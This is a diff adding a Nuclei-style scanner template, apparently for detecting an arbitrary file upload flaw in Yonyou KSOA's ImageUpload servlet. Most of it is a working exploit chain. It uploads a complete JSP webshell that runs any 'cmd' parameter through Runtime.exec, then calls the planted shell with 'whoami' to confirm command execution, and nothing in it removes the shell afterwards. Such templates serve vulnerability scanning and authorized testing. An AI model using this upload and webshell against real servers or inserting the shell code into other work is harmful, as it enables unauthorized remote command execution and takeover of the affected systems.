@@ -1,0 +1,64 @@
+id: yonyou-ksoa-file-upload
+info:
+  name: Yonyou KSOA Arbitrary File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Yonyou KSOA has an arbitrary file upload vulnerability. Exploitation allows attackers to upload arbitrary files, obtain webshell access, control server permissions, and read sensitive information.
+  classification:
+    cvss-score: 9.9
+  tags:
+    - file-upload
+    - webshell
+http:
+  - raw:
+      - |
+        GET /servlet/com.sksoft.bill.ImageUpload?filepath=test&filename=test.jsp HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        part: body
+        regex:
+          - "<root>/pictures/test/test.jsp</root>"
+  - raw:
+      - |
+        POST /servlet/com.sksoft.bill.ImageUpload?filepath=test&filename=test.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/plain
+
+        <%%
+        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();
+        int a = -1;
+        byte[] b = new byte[2048];
+        out.print("<pre>");
+        while((a=in.read(b))!=-1){
+            out.println(new String(b));
+        }
+        out.print("</pre>");
+        %%>
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        part: body
+        regex:
+          - "pictures/test/test.jsp"
+  - raw:
+      - |
+        GET /pictures/test/test.jsp?cmd=whoami HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        part: body
+        regex:
+          - "<pre>.*?</pre>"
